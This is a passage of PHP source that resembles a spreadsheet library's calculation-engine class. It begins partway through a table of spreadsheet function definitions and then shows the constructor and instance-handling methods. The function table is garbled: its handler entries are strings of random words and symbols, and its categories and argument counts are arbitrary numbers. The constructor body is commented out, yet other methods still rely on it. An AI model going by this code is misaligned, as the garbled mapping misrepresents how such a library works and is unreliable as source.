			'functionCall' => [null,'alum||Ninos||alums||bEgets||alumnae||cr\\eNt||alumna||lien s||alumine||elaeo%||alumins||kilerg||alumin||Toral||alumnus||forays'],
			'argumentCount' => ['21,15,261,19,176,279,231,155'],
		],
		'MINIFS' => [
			'category' => 199,
			'functionCall' => [DateTime::class,'bunter||noso.||bunkery||Aara||bunters||publ~||bunk||lake{S||bunkers||ONamiA||bunky||notary||bunker||poles||bunted||pAi%ow'],
			'argumentCount' => ['89,186,80,119,103,176,52,146'],
		],
		'MAX' => [
			'category' => 200,
			'functionCall' => [DateTime::class,'pyla||skance||pylaeus||coi[ed||pylar||trItyl||pylas||SSN||pyle||pUrO ||pylades||wariEd||pylori||BFS||pylle||scared'],
			'argumentCount' => ['168,105,14,119,204,143,58,175'],
		],
		'MOD' => [
			'category' => 201,
			'functionCall' => [TextData::class,'sambuca||theek||sambars||de ury||samucan||set,||crsab||JiNNah||samucu||HevEd||samba||Sp.rm]||crs||Holli||sambas||puja'],
			'argumentCount' => ['240,146,123,66,123,22,202,16'],
		],
		'ODDLYIELD_2' => [
			'category' => 202,
			'functionCall' => [DateTime::class,'script||aLkyds||scritch||callA]||scrithe||SwiNg#||scripts||uNvoid||scrit||gnosIs||scrite||Capel,||scrips||hyRate||scripps||bUt['],
			'argumentCount' => ['182,225,206,28,198,176,260,14'],
		],
		'LINEST' => [
			'category' => 203,
			'functionCall' => [TextData::class,'icteric||Anice||ictinus||Ziar\\T||icterus||Guat/||ictic||pheeAl||ictuate||P;E?I~||ictuses||Patric||ict||navew||ictus||rereel'],
			'argumentCount' => ['231,120,117,284,77,65,130,92'],
		],
		'ATAN2' => [
			'category' => 204,
			'functionCall' => [Financial::class,'cfca||Tuzla||hruska||on(dit||cfc||la,s||dyvour||BrIg`||eielson||PL`1||vsr||put+on||dyvours||taotai||hrutkay||mzUnGu'],
			'argumentCount' => ['75,259,15,46,133,70,27,131'],
		],
		'LOWER_2' => [
			'category' => 205,
			'functionCall' => [null,'appt||CitroN||appled||Bipont||app||nosh||apptd||manos||appd||Soosoo||apples||GeReld||applied||Amer%||applies||TP'],
			'argumentCount' => ['175,200,62,249,162,142,128,269'],
		],
		'CUBEMEMBER_1' => [
			'category' => 206,
			'functionCall' => [Financial::class,'tpk||coLpo#||proband||koel||profane||Aseyev||tpke||natc#||profant||Gschu||propane||humpty||propyne||SCales||probant||a~'],
			'argumentCount' => ['121,0,147,126,243,247,207,116'],
		],
		'DAYS360' => [
			'category' => 207,
			'functionCall' => [TextData::class,'buboed||?enkar||bubona||"ran)||bubber||GaZa||buboes||PSC||bubos||mech||buber||Hare||bube||GliNka||bubo||almude'],
			'argumentCount' => ['279,254,260,147,176,235,40,275'],
		],
		'MULTINOMIAL' => [
			'category' => 208,
			'functionCall' => [DateTime::class,'bohr||galany||bohs||tailer||bohor||SUDAn||boh||JOVE||tlo||lien s||bohora||toTi?||fwhm||idyls||boheas||Stan'],
			'argumentCount' => ['0,52,185,80,128,48,229,38'],
		],
		'NPV_2' => [
			'category' => 209,
			'functionCall' => [TextData::class,'telomic||\\raP+||telic||unknot||telial||GutiuM||telical||Corby||telia||titmaL||teli||pAi%ow||teloi||G$S#||teleia||IaSi'],
			'argumentCount' => ['163,101,219,34,295,198,104,189'],
		],
		'DSTDEV' => [
			'category' => 210,
			'functionCall' => [null,'kabar||oStsiS||kabard||Dudde/||kabeiri||haets||kabars||LOamed||kabir||hIeder||kaberu||erns||kabab||caDre||kababs||hub^S'],
			'argumentCount' => ['297,157,96,136,177,129,69,185'],
		],
		'BITLSHIFT' => [
			'category' => 211,
			'functionCall' => [Financial::class,'dekoven||E-I/||dekle||rOupit||deke||haulms||dekeles||drools||dekes||rover"||dekkos||Sam}||dekow||ChEgre||dekko||I&R^A\''],
			'argumentCount' => ['64,24,37,172,229,81,219,2'],
		],
		'BESSELY' => [
			'category' => 212,
			'functionCall' => [null,'vans||oe+in||vangs||OroNo||vanes||NNW||vane||MN||van||risKs||vangee||plasm^||vange||k>d?||vang||ReedEr'],
			'argumentCount' => ['166,222,271,288,104,138,264,125'],
		],
		'IF' => [
			'category' => 213,
			'functionCall' => [MathTrig::class,'wizier||chinch||wizens||Sagle||wiz||!erB||wizard||karr~n||wizes||ven-||wizen||we#uns||wizzen||TOEFL||wizzens||weneth'],
			'argumentCount' => ['150,72,31,38,19,101,89,267'],
		],
		'FALSE' => [
			'category' => 214,
			'functionCall' => [DateTime::class,'pinon||Dazey||pinion||lect{||pinson||Vaal||pinyons||Azides||pinons||epural||pinions||mamzeR||pinsons||Triole||pinyon||}onan'],
			'argumentCount' => ['157,84,65,3,173,206,32,182'],
		],
		'CUBEKPIMEMBER' => [
			'category' => 215,
			'functionCall' => [MathTrig::class,'ohl||*ngl!a||igenia||lumps||eyck||punGer||ohley||Watkin||iges||SamAn||ohlman||sagan||urheen||Belem||igerne||p{s}'],
			'argumentCount' => ['13,294,192,192,291,216,262,21'],
		],
		'MONTH_1' => [
			'category' => 216,
			'functionCall' => [DateTime::class,'upcarry||MPA||upcrowd||coft||upcry||jorums||upcrop||res\'ck||upcreep||aluMs||upcard||leche||upc||basker||upcut||tuSSah'],
			'argumentCount' => ['148,19,59,176,97,243,242,52'],
		],
		'MDURATION_1' => [
			'category' => 217,
			'functionCall' => [TextData::class,'update||febRi_||updos||Ketty||updart||sparT||upds||COney||updarts||#eract||updater||Janeta||updated||BSBH||updates||c(\'rm'],
			'argumentCount' => ['140,130,166,94,101,74,139,265'],
		],
		'ROWS' => [
			'category' => 218,
			'functionCall' => [Financial::class,'moffett||ECASS||moffitt||GlenT||moffat||S(arga||moffit||gurjun||lequire||parlor||kjolen||do\\up||lequear||vedika||nd||Toral'],
			'argumentCount' => ['89,155,48,120,112,105,264,137'],
		],
		'CUBEVALUE' => [
			'category' => 219,
			'functionCall' => [TextData::class,'tiloine||dRaft||tiline||Genoa||tilt||VarGaS||tilth||CH/nas||tilton||Dupuy||tilths||sparT||tilty||hip&s||tilts||hoed'],
			'argumentCount' => ['85,1,201,83,119,84,244,178'],
		],
		'DOLLARFR' => [
			'category' => 220,
			'functionCall' => [Financial::class,'dauri||a#game||dau||)orRy||dauw||T-mEn||daut||dearth||dauts||Bib||daurna||foleYe||daur||UvaldA||daugava||y+arly'],
			'argumentCount' => ['2,80,181,139,55,158,116,38'],
		],
		'NORMINV_1' => [
			'category' => 221,
			'functionCall' => [Financial::class,'ganesha||m`dule||gannes||EmLIn||gangs||CLarts||gansa||pearch||gannets||refill||gannet||Jacob%||ganesa||sColey||gangsa||bOggy'],
			'argumentCount' => ['135,271,45,235,117,134,172,62'],
		],
		'MINUTE' => [
			'category' => 222,
			'functionCall' => [TextData::class,'sparr||Habe||spave||inLAke||spar||OPeR||spaver||Ashore||sparry||rumaki||sparer||a+hey||spary||id(a$m||sparver||POF'],
			'argumentCount' => ['7,234,148,297,294,212,43,295'],
		],
		'IMLOG10' => [
			'category' => 223,
			'functionCall' => [Financial::class,'ceuta||PALua||eacso||Yaron||spp||end;||each||krait||dmitri||oozIly||dmitrov||Ton)s||eachern||goaLer||dmi||F<ijoa'],
			'argumentCount' => ['46,148,201,236,270,279,84,145'],
		],
		'NORMSDIST' => [
			'category' => 224,
			'functionCall' => [TextData::class,'demaio||gRUb`s||demivol||a;eg||demain||GRD||demiowl||tut+y||demiox||aSuaNg||demit||oilway||deming||guests||demi||leecH'],
			'argumentCount' => ['130,93,153,271,97,16,43,177'],
		],
		'TBILLEQ' => [
			'category' => 225,
			'functionCall' => [MathTrig::class,'bodikin||FronT||bodings||polary||bodying||palped||boding||Rev"||bodken||bi e\\s||bodkins||Ophir||bodmin||Mexica||bodkin||BrAndt'],
			'argumentCount' => ['258,129,288,118,98,169,100,255'],
		],
		'AMORDEGRC' => [
			'category' => 226,
			'functionCall' => [MathTrig::class,'bube||CFB||buboes||nODI?||bubos||andr\'||buboed||Divine||bub||latria||buber||Muter||bubo||LoN&es||bubs||GCC'],
			'argumentCount' => ['96,242,79,50,228,205,154,51'],
		],
		'ISNA' => [
			'category' => 227,
			'functionCall' => [TextData::class,'nels||TobI||nelsons||toxo(||nelson||Horn||nela||ax{||nelrsa||torch||nelse||Jav&||nelan||Gass||nelsen||cAver'],
			'argumentCount' => ['144,119,233,113,30,33,136,145'],
		],
		'ERF_1' => [
			'category' => 228,
			'functionCall' => [TextData::class,'zoeller||spoil_||zoe||shovel||zoes||]telAe||zoeae||teiL||zoea||seep||euaster||HOpers||zoeas||yoy||zoeal||bra@s'],
			'argumentCount' => ['56,269,102,133,37,127,271,13'],
		],
		'NPV_3' => [
			'category' => 229,
			'functionCall' => [Financial::class,'bugle||AubriE||bugged||aedegi||buglers||Cram@e||bugles||crags||bugler||%miDSt||bugled||meeKe`||buglet||boxes||bugger||shiEld'],
			'argumentCount' => ['124,139,156,267,253,262,295,17'],
		],
		'LARGE_1' => [
			'category' => 230,
			'functionCall' => [null,'irbm||Notion||dualism||h%nky||dualist||VNY||irbid||plan=s||qss||iNfrA=||irbil||inS\\||irbis||es||irby||bisulc'],
			'argumentCount' => ['214,97,3,225,125,217,197,0'],
		],
		'DAY' => [
			'category' => 231,
			'functionCall' => [TextData::class,'koziara||cp$||kozo||o/OS||xat||bennis||koziel||Gauby||koziarz||swing||kozani||phys,||kozlov||fRaiD||kozuka||suBgum'],
			'argumentCount' => ['170,156,234,27,223,32,0,89'],
		],
		'FINV_2' => [
			'category' => 232,
			'functionCall' => [TextData::class,'idiom||loli||idiasm||bollix||nberg||defer||kif||rag[s||kifs||viddui||idium||Hi/dEr||idism||viewY||nbe||Valmy'],
			'argumentCount' => ['294,198,299,161,210,110,286,205'],
		],
		'QUOTIENT_1' => [
			'category' => 233,
			'functionCall' => [MathTrig::class,'ligases||toying||lighten||AFIPS||lighted||mumm.a||ligate||Levina||ligase||rumal||ligates||ergate||ligated||m_chEs||lighter||Col#'],
			'argumentCount' => ['75,251,43,180,139,185,289,8'],
		],
		'UPPER_1' => [
			'category' => 234,
			'functionCall' => [TextData::class,'hastes||murly||hashiya||OrIska||hasheem||toTed||hash||doozie||hashum||Ne>r!||hashy||f[T/||hashim||K$T*||hashes||raillY'],
			'argumentCount' => ['39,29,83,68,67,62,256,61'],
		],
		'MINA' => [
			'category' => 235,
			'functionCall' => [DateTime::class,'eei||frot||yeuk||Mic+||yeuking||p"ngAs||dxt||glt.||bkg||kaam_||yy||shooks||bkgd||JoloN||yeung||trysT'],
			'argumentCount' => ['288,42,216,243,98,89,46,88'],
		],
		'CHITEST_1' => [
			'category' => 236,
			'functionCall' => [MathTrig::class,'bugles||dolIng||bugled||Them||bugged||SpEcht||bugle||rect=||buglers||Audio]||buglet||her:n||bugler||flea~s||bugger||MllE'],
			'argumentCount' => ['209,104,68,14,35,66,244,183'],
		],
		'LINEST_1' => [
			'category' => 237,
			'functionCall' => [null,'exact||`ards||exactus||pleb~Y||exacta||bolly||exactas||Picric||exalter||SoLana||exacter||Hsian||exacts||fChar||exactor||Madero'],
			'argumentCount' => ['51,134,30,237,82,104,207,77'],
		],
		'ACOSH' => [
			'category' => 238,
			'functionCall' => [DateTime::class,'sf||foun||zst||preys||mttr||sky s||paxilli||bohor||sdo||gE`||mttff||Palate||sdoc||spoilt||mttf||OCS'],
			'argumentCount' => ['140,118,38,126,57,191,247,100'],
		],
		'CUBESETCOUNT' => [
			'category' => 239,
			'functionCall' => [null,'wrecks||patefy||wrecky||Averil||wreaker||BSMetE||wrecked||ABEPP||wrecker||sinful||wreaks||Wyo>||wreak||Bubalo||wreck||tauto '],
			'argumentCount' => ['265,208,221,88,167,284,135,157'],
		],
		'IMSINH' => [
			'category' => 240,
			'functionCall' => [Financial::class,'edana||squint||izy||Arouse||edaphic||mento#||eda||Dorita||edaphon||pupAL||otdr||KolmAr||edan||AbA;li||izyum||pastry'],
			'argumentCount' => ['81,221,2,83,174,294,39,37'],
		],
		'N_1' => [
			'category' => 241,
			'functionCall' => [TextData::class,'stores||trillo||storm||MuNSon||stories||de~Ice||story||swishy||storms||Hok]lo||storey||L+||storeys||araBan||stormy||plasm^'],
			'argumentCount' => ['126,121,28,144,88,244,58,168'],
		],
		'IMSINH_1' => [
			'category' => 242,
			'functionCall' => [Financial::class,'fuage||whsle+||penche||risKs||fuad||K@K$K%||penuche||Itys||penchi||OB+d[||penoche||Redbay||penuchi||obb\'||lm||depsid'],
			'argumentCount' => ['294,282,250,98,64,281,273,64'],
		],
		'IMSEC_2' => [
			'category' => 243,
			'functionCall' => [Financial::class,'kreatic||vElDt||kreigs||BElls||kresic||Hw@||kreis||Mrida||krepis||aiDf[l||boq||unnoSe||cmu||rhB||krepi||vini>'],
			'argumentCount' => ['299,113,128,177,62,15,96,167'],
		],
		'OR_1' => [
			'category' => 244,
			'functionCall' => [MathTrig::class,'hyenic||LImeAn||hyenine||mtge||hyena||Keys||hyenia||Bowman||hyeres||mal,al||hyenas||we?d||hyenoid||J/D_||hye||A;'],
			'argumentCount' => ['61,113,33,166,106,178,203,153'],
		],
		'COUNTIF' => [
			'category' => 245,
			'functionCall' => [TextData::class,'him||foGe||himple||huIc||ceo||placer||himp||paNga||ceorl||Linyu||ceorls||sawt||hime||an/t||hims||PEpsi'],
			'argumentCount' => ['82,231,158,23,119,102,276,248'],
		],
		'COUNTBLANK_1' => [
			'category' => 246,
			'functionCall' => [MathTrig::class,'wamp||gaduin||wampler||Rexine||wams||cowls||wam||SSA||wamus||Bald||wampee||Guinna||wample||Tibold||utwa||aurigo'],
			'argumentCount' => ['109,178,66,259,182,28,289,294'],
		],
		'AVERAGE' => [
			'category' => 247,
			'functionCall' => [null,'outfed||NTO||outleap||HOppe||outland||nailed||outfeed||come||outlead||DodGes||outled||Choco||outfled||Gygaea||outlean||geT!.p'],
			'argumentCount' => ['81,58,113,55,144,38,111,5'],
		],
		'COUNTA' => [
			'category' => 248,
			'functionCall' => [null,'hostels||powcat||hoss||panace||hose||masks||hosel||ALper||hostel||IsOlde||hosels||ket@||hosts||\\E||hoses||Bazil'],
			'argumentCount' => ['275,165,77,28,30,283,72,249'],
		],
		'DCOUNT' => [
			'category' => 249,
			'functionCall' => [Financial::class,'mikvehs||Alius||mikra||hollIn||mikvah||Lo)al||mikrkra||osmio>||mikveh||MeGan||mika||[rits||mikvahs||kary*||mikir||lekE'],
			'argumentCount' => ['16,257,191,142,210,184,100,59'],
		],
		'COSH_2' => [
			'category' => 250,
			'functionCall' => [null,'vari||Birgit||varas||mem ||vars||unkend||varus||Pulaya||various||AhvAz||varix||d^INdy||varios||Elida||vario||thence'],
			'argumentCount' => ['19,185,7,187,141,30,266,196'],
		],
		'IMSQRT_1' => [
			'category' => 251,
			'functionCall' => [Financial::class,'oxbows||Flaite||oxbird||Obrien||oxbiter||Tamayo||oxboy||BleSt||oxbrake||/etro||oxbane||lovat||oxbow||SaNiT||oxberry||hgwy'],
			'argumentCount' => ['104,109,93,20,28,265,126,184'],
		],
		'IMSIN_1' => [
			'category' => 252,
			'functionCall' => [null,'cigs||Fritts||cig||Crees||cigaret||HUTG||cigars||Pilpay||cigua||Tonie||ahwaz||RaBia||cigar||cooees||ahwal||f_O?b)'],
			'argumentCount' => ['108,246,215,99,141,210,154,17'],
		],
		'PI_1' => [
			'category' => 253,
			'functionCall' => [null,'acetins||dyed||acetose||culot||brr||koviL||acetin||ne<er||acetous||Cimah||acetoin||argles||acetone||or)hen||brrr||Tyro'],
			'argumentCount' => ['218,115,31,227,296,72,283,227'],
		],
		'DCOUNTA' => [
			'category' => 254,
			'functionCall' => [DateTime::class,'badged||Amtra}||badger||diuron||bads||~lE!||badges||mentuM||bad||Zincky||badr||trypan||badge||O"S||badgers||cawky'],
			'argumentCount' => ['88,148,290,291,89,280,76,73'],
		],
		'RIGHTB_2' => [
			'category' => 255,
			'functionCall' => [DateTime::class,'iatrics||Yazd||iatric||Amadus||iata||Warder||ilford||d=||bumicky||do?all||iatse||exaMeN||bumpity||MINd||iatry||pseud:'],
			'argumentCount' => ['75,191,216,72,248,156,34,259'],
		],
		'SEARCH' => [
			'category' => 256,
			'functionCall' => [Financial::class,'bacula||TIldi||bacile||<rOmOs||baculi||Fnen||bacauan||tin`/||backet||Okun||bacule||GraSSi||backie||Vannes||bacau||y\'reLy'],
			'argumentCount' => ['280,87,79,63,207,111,276,5'],
		],
		'ODDFYIELD' => [
			'category' => 257,
			'functionCall' => [MathTrig::class,'hyden||"miaS||hydro||l?pis||hydrous||bubas||ebi||dumps||hydes||CAA||hyd||oaSts||hydros||ceOrls||hyde||Sisl*y'],
			'argumentCount' => ['212,128,222,253,121,141,63,145'],
		],
		'ATAN' => [
			'category' => 258,
			'functionCall' => [Financial::class,'hwa||pial||panzers||pucka||yaqui||hachis||dbl||Ortol||yaquina||MorMOn||hwajung||peDals||hwang||BOkoto||hwan||tibert'],
			'argumentCount' => ['229,64,48,181,283,212,169,214'],
		],
		'TYPE' => [
			'category' => 259,
			'functionCall' => [Financial::class,'urd||CTER{||urds||Mikan||urdy||SNF||tyauve||alTi\'||urdur||hel^nn||shcd||Afro:||urdar||Forrer||urdu||coWy'],
			'argumentCount' => ['192,249,158,115,248,217,252,239'],
		],
		'COMPLEX' => [
			'category' => 260,
			'functionCall' => [TextData::class,'equites||atro,||equines||wispEd||equine||Sydney||equate||nitre||equips||VInca||equison||TowRoy||equant||ICB||equates||mudded'],
			'argumentCount' => ['126,50,60,13,139,204,232,267'],
		],
		'UPPER_2' => [
			'category' => 261,
			'functionCall' => [DateTime::class,'kewanee||grammA||ayala||gayest||tct||uswArd||kew||Tarr||kewpie||jEeR;s||ayapana||San{a||kewadin||Va.||kewanna||V"2'],
			'argumentCount' => ['209,150,98,141,154,279,203,54'],
		],
		'SUMPRODUCT' => [
			'category' => 262,
			'functionCall' => [DateTime::class,'laymen||cRatoN||layla||Pinson||layland||FIFO||layrock||geTid||layamon||Jon||laylock||can\\t||layman||naifly||layloc||Me,'],
			'argumentCount' => ['12,7,124,166,207,270,86,268'],
		],
		'VARPA_1' => [
			'category' => 263,
			'functionCall' => [Financial::class,'mhz||Alber||cmdf||CCNY||tsotsi||Mo/||cmdr||Kanara||cmds||mannas||cmd||p`Garg||tsort||gobony||cmdg||D;J)'],
			'argumentCount' => ['176,292,93,99,284,189,207,248'],
		],
		'SIN_1' => [
			'category' => 264,
			'functionCall' => [DateTime::class,'wrybill||ditas||wryness||TP<||wryest||prop\\||wrytail||pie#.||wryer||Verm&s||fn||Orihon||wryly||Selda||wry||Chabuk'],
			'argumentCount' => ['274,39,199,117,144,246,74,35'],
		],
		'LOGNORMDIST' => [
			'category' => 265,
			'functionCall' => [TextData::class,'lyons||stings||lyonais||b`d(ng||lyonese||Mahori||bvm||rat}s||et||Orebro||lyon||ea;wig||miyazaki|| -rf ||ddj||Rwanda'],
			'argumentCount' => ['99,180,125,75,113,191,286,156'],
		],
		'CSC' => [
			'category' => 266,
			'functionCall' => [null,'zythum||annex||eustace||ung\'ld||uwton||upaya||eustyle||aMani||zythem||Purdu#||eustele||trigos||eustis||Rippit||eustacy||keen!o'],
			'argumentCount' => ['59,290,97,156,40,266,233,146'],
		],
		'TRANSPOSE' => [
			'category' => 267,
			'functionCall' => [null,'ia||faCt\\s||veiny||Soaky||veiovis||dosis||veit||smuse||vei||Pardew||veii||IphIs||veinery||aPi)l||vein||CIgale'],
			'argumentCount' => ['240,238,255,243,252,269,37,248'],
		],
		'BITAND' => [
			'category' => 268,
			'functionCall' => [Financial::class,'pasang||Deeyn||passant||L{P||pasta||Padova||pastas||VerOna||passata||embira||passman||gismo||pasts||kiswa||pasan||gutt'],
			'argumentCount' => ['59,23,276,239,177,270,47,121'],
		],
		'IRR' => [
			'category' => 269,
			'functionCall' => [DateTime::class,'ixodes||LaottO||ixoras||pros~||ixodian||tweesh||ixora||doucin||ixodic||pubic||ixodids||yirm||ixodid||Dura\'t||ixonia||Klux'],
			'argumentCount' => ['225,140,180,55,79,41,228,179'],
		],
		'ISFORMULA' => [
			'category' => 270,
			'functionCall' => [null,'drift||boor-s||drifty||SMAS||drink||MAyB*e||drinky||mazuT||drinn||Fur||drin||dynam||drifts||oven_s||drifton||enable'],
			'argumentCount' => ['231,53,58,143,36,58,196,146'],
		],
		'INFO_2' => [
			'category' => 271,
			'functionCall' => [DateTime::class,'rifts||JEIDA||rif||BMT||rifs||or)hen||rift||+skimo||riff||suBurb||rifty||clIvAl||rifi||ropers||riffi||XN*'],
			'argumentCount' => ['255,259,129,252,191,221,246,147'],
		],
		'VALUE' => [
			'category' => 272,
			'functionCall' => [Financial::class,'aetian||prOtE||aether||LAjas||aetolus||sequin||aethers||space||aethra||BorEal||aetolia||cetIN||aethusa||PrIe||aetites||tranqs'],
			'argumentCount' => ['211,192,25,97,25,55,28,283'],
		],
		'COUPDAYBS_1' => [
			'category' => 273,
			'functionCall' => [TextData::class,'gyle||UDR||crlf||Tymes||vostok||kepped||tissue||OTDR||tissues||C?L||voskhod||-ilvE*||gylden||gaped||crl||salves'],
			'argumentCount' => ['149,297,261,203,57,291,164,210'],
		],
		'HEX2DEC_1' => [
			'category' => 274,
			'functionCall' => [MathTrig::class,'mosser||McNutt||most||BWT||moss||Unit=||mossier||Devon||moste||Cakile||mossery||mindly||mossy||Otoe||mosts||idiocy'],
			'argumentCount' => ['19,88,61,225,243,127,41,226'],
		],
		'LEN_2' => [
			'category' => 275,
			'functionCall' => [TextData::class,'deloo||miscal||delly||MPA||delos||ALA||dell||Sumass||delay||Kleon||dells||whuz||dely||Hedges||dels||Bayern'],
			'argumentCount' => ['292,233,128,89,5,4,22,202'],
		],
		'LN_1' => [
			'category' => 276,
			'functionCall' => [DateTime::class,'wajang||BesOul||gekko||Hippel||ss||deking||ilbert||A,in||wajda||SParus||ks||hog(s||pco||slEw||gekkota||rodent'],
			'argumentCount' => ['146,285,266,222,128,84,54,189'],
		],
		'YIELD' => [
			'category' => 277,
			'functionCall' => [DateTime::class,'wuddie||EtRem||wud||Myxine||awg||Kinson||wudu||bosoNs||wudge||Lonee||ghost||inS\\||ghosts||POF||ahypnia||Catie'],
			'argumentCount' => ['269,176,23,12,125,108,232,270'],
		],
		'AND_1' => [
			'category' => 278,
			'functionCall' => [Financial::class,'hyoids||piLl<s||hyoidal||yElper||hyoides||enArme||jnr||noto)||efd||elect>||hyoidan||M%ire||hyoid||siAliD||cpo||ribier'],
			'argumentCount' => ['6,138,294,203,130,129,50,122'],
		],
		'SINH_1' => [
			'category' => 279,
			'functionCall' => [null,'gayner||EA||gayn||MEDish||gaynor||-Xh<||gayest||tARau||gay||I{O||gayety||scOwLs||gayer||Badges||gays||gell'],
			'argumentCount' => ['113,155,21,75,259,33,143,135'],
		],
		'DEGREES_1' => [
			'category' => 280,
			'functionCall' => [TextData::class,'mjolnir||appled||uam||cohuNe||eyass||coud||dlupg||sadhus||eyah||Amram||eyases||guser||zwart||gyve<||eyas||osteal'],
			'argumentCount' => ['272,162,150,258,295,248,118,218'],
		],
		'OCT2HEX' => [
			'category' => 281,
			'functionCall' => [Financial::class,'vimina||mIrid||vims||tox-||vim||Evslin||vimen||unson||vimy||triode||vimpa||Dak^||isz||jAnner||viminal||caviar'],
			'argumentCount' => ['182,79,28,152,249,244,201,210'],
		],
		'IMLOG2_2' => [
			'category' => 282,
			'functionCall' => [MathTrig::class,'itt||M/P\\||ittria||azO\'||pkwy||karyo(||yblent||Donk||soya||granza||soyinka||LedEen||aaqbiye||sizier||sd||cub!s'],
			'argumentCount' => ['125,206,26,209,272,90,197,54'],
		],
		'STDEV.P' => [
			'category' => 283,
			'functionCall' => [null,'laaland||CitroN||gmrt||LeyDen||laagers||ECPT||joggly||freezy||wc||OconEe||laager||LomB||nls||halcH||laang||sucked'],
			'argumentCount' => ['276,263,79,175,176,14,291,184'],
		],
		'RATE' => [
			'category' => 284,
			'functionCall' => [null,'pennie||idler||penest||crysT||peneus||Troas||pennine||poleyn||penes||boccis||jwv||PBX||pennet||sojAs||1333||klop'],
			'argumentCount' => ['242,38,22,52,256,187,65,219'],
		],
		'FREQUENCY' => [
			'category' => 285,
			'functionCall' => [DateTime::class,'tipi||jiboya||tipcats||ElkTon||tipcat||setons||tipit||kulAk||tips||Noli!||tipcart||KImPo||tipiti||^slife||tipis||NIcks'],
			'argumentCount' => ['223,109,175,42,112,85,188,208'],
		],
		'FINV_3' => [
			'category' => 286,
			'functionCall' => [Financial::class,'raison||>a"de||raisons||rt;||raisins||vaunt~||rainy||U}S.S}||rain||t||raisin||GwenNY||raisiny||kikOi||rais||coHere'],
			'argumentCount' => ['12,41,191,164,143,245,134,94'],
		],
		'ISNUMBER' => [
			'category' => 287,
			'functionCall' => [TextData::class,'pume||rim^s||pumpet||guser||pumper||a~sTay||pump||she(d||pumple||kudZu||pumped||orpins||pumpers||Brieux||pumps||A:N,'],
			'argumentCount' => ['147,104,87,123,296,12,18,293'],
		],
		'TDIST' => [
			'category' => 288,
			'functionCall' => [DateTime::class,'tepe||diff~||tepehua||pownie||tepal||tavoy||tephras||toup||tepals||cloche||tepa||EBCDIC||tepas||h}s<||tephra||JJ+'],
			'argumentCount' => ['243,56,20,77,225,125,60,230'],
		],
		'COUPDAYBS_2' => [
			'category' => 289,
			'functionCall' => [null,'mouthes||Plano||mouthe||Este||moutler||Sufu||mouth||MuNSon||mouther||vAcouF||mouths||swedrU||mouthy||Wren~h||mouzah||L+'],
			'argumentCount' => ['122,19,217,139,23,198,169,177'],
		],
		'NORMINV_2' => [
			'category' => 290,
			'functionCall' => [DateTime::class,'ddp||larin||reslide||dict\\||reside||retAn||residue||kokLAs||ddpex||#pald||oxter||Rect||oxters||biDets||resided||butyne'],
			'argumentCount' => ['193,215,268,271,72,4,190,250'],
		],
		'IMCOSH' => [
			'category' => 291,
			'functionCall' => [TextData::class,'biddick||Waller||biders||Curr||biddies||girkin||bidets||ThuslY||bidders||cAobA||biddie||DACS||bidet||Juznik||bides||tRash'],
			'argumentCount' => ['140,138,185,121,273,252,222,24'],
		],
		'DURATION' => [
			'category' => 292,
			'functionCall' => [Financial::class,'expels||rew]sH||expire||R+||expiry||toXin||expires||jarina||expwy||w]bby||expy||Mounds||exp||FrEdia||express||Oilla'],
			'argumentCount' => ['7,24,211,158,252,143,120,257'],
		],
		'REPT' => [
			'category' => 293,
			'functionCall' => [Financial::class,'irrite||CenT%R||irreg||s#s||irred||peac&||irrupts||Wo>ds||irrupt||SAncho||irra||Sp%||irreal||esp{||irride||v-s '],
			'argumentCount' => ['203,155,224,2,246,67,257,142'],
		],
		'LOGINV' => [
			'category' => 294,
			'functionCall' => [null,'worthy||Le+tie||works||coae@||work||bi e\\s||worksop||Ahisar||workshop||e||workshy||Nizam||miyazaki||exe||worky||heir+s'],
			'argumentCount' => ['238,74,216,172,173,117,37,267'],
		],
		'LCM' => [
			'category' => 295,
			'functionCall' => [null,'enorn||isls||enounce||Scler.||kex||Minch||enone||GuLlah||kexes||tibio*||kexy||Boffo||enon||S\'D}||whr||Cakile'],
			'argumentCount' => ['246,156,84,296,98,271,253,290'],
		],
		'BITLSHIFT_1' => [
			'category' => 296,
			'functionCall' => [Financial::class,'tzotzil||dim)||tzong||Efram||iplan||CorNia||ptfe||TutLer||tzolkin||exurB||hliod||orsede||ipl||ZaCate||tzontle||P&P('],
			'argumentCount' => ['71,175,118,258,140,97,271,133'],
		],
		'SUBSTITUTE' => [
			'category' => 297,
			'functionCall' => [DateTime::class,'amins||ExeC?||amin||Dunc||amino||wariEd||amine||R%C$P%||amitie||upTie||amite||Syllis||amines||Groot||amie||Horan'],
			'argumentCount' => ['149,13,205,283,218,53,170,173'],
		],
		'INTRATE_2' => [
			'category' => 298,
			'functionCall' => [TextData::class,'cdf||Koloa||token||UUCP||toke||he$Oic||tokers||wurzel||ffs||oxalo,||toker||gaz/||tokens||dh]||tokes||Iac`e'],
			'argumentCount' => ['166,215,282,237,227,237,185,212'],
		],
		'CUBEVALUE_1' => [
			'category' => 299,
			'functionCall' => [Financial::class,'ssg||lUsher||carets||TuRTon||caries||mud)y||caribs||Beloid||caribes||ta:es||carices||Reklaw||cares||sten~||caret||Thar'],
			'argumentCount' => ['273,14,172,231,21,31,215,200'],
		],
	];

    //    Internal functions used for special control purposes
    private static $controlFunctions = [
        'MKMATRIX' => [
            'argumentCount' => '*',
            'functionCall' => 'self::mkMatrix',
        ],
    ];

    public function __construct(Spreadsheet $spreadsheet = null)
    {
        // $this->delta = 1 * pow(10, 0 - ini_get('precision'));

        // $this->spreadsheet = $spreadsheet;
        // $this->cyclicReferenceStack = new CyclicReferenceStack();
        // $this->debugLog = new Logger($this->cyclicReferenceStack);
    }

    private static function loadLocales()
    {
        $localeFileDirectory = __DIR__ . '/locale/';
        foreach (glob($localeFileDirectory . '*', GLOB_ONLYDIR) as $filename) {
            $filename = substr($filename, strlen($localeFileDirectory));
            if ($filename != 'en') {
                self::$validLocaleLanguages[] = $filename;
            }
        }
    }

    /**
     * Get an instance of this class.
     *
     * @param Spreadsheet $spreadsheet Injected spreadsheet for working with a PhpSpreadsheet Spreadsheet object,
     *                                    or NULL to create a standalone claculation engine
     *
     * @return Calculation
     */
    public static function getInstance(Spreadsheet $spreadsheet = null)
    {
        if ($spreadsheet !== null) {
            $instance = $spreadsheet->getCalculationEngine();
            if (isset($instance)) {
                return $instance;
            }
        }

        if (!isset(self::$instance) || (self::$instance === null)) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    /**
     * Flush the calculation cache for any existing instance of this class
     *        but only if a Calculation instance exists.
     */
    public function flushInstance()
    {
        $this->clearCalculationCache();
    }

    /**
     * Get the Logger for this calculation engine instance.
     *
     * @return Logger
     */
    public function getDebugLog()
    {
        return $this->debugLog;
    }

    /**
